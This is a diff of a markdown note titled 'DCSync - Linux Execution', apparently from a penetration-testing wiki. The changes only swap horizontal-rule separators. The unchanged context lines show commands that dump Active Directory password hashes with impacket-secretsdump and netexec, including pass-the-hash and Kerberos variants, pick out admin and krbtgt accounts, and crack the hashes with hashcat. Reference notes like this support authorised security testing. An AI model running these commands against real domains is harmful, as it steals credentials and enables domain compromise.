@@ -17,7 +17,7 @@ linked:
 ---
 # DCSync - Linux Execution
 
-***
+---
 
 ## impacket-secretsdump — Full NT dump
 
@@ -37,7 +37,7 @@ impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-d
 impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc -outputfile corp_dump
 ```
 
-___
+---
 
 ## impacket-secretsdump — Targeted
 
@@ -61,7 +61,7 @@ impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local \
 # corp.local\krbtgt:aes128-cts-hmac-sha1-96:ZZZZZZZZ...
 ```
 
-___
+---
 
 ## impacket-secretsdump — Pass-the-Hash
 
@@ -80,7 +80,7 @@ impacket-secretsdump \
   -just-dc-ntlm
 ```
 
-___
+---
 
 ## impacket-secretsdump — Kerberos ticket
 
@@ -98,7 +98,7 @@ impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local -just-
 # Requiere FQDN — no IP
 ```
 
-___
+---
 
 ## nxc / netexec --ntds
 
@@ -115,7 +115,7 @@ nxc smb dc01.corp.local -u administrator -p 'P@ssw0rd' --ntds --enabled
 # Output en ~/.nxc/logs/
 ```
 
-___
+---
 
 ## Output format
 
@@ -138,4 +138,4 @@ grep -i "admin\|krbtgt\|svc_\|:500:" corp_dump.ntds
 hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-***
+---
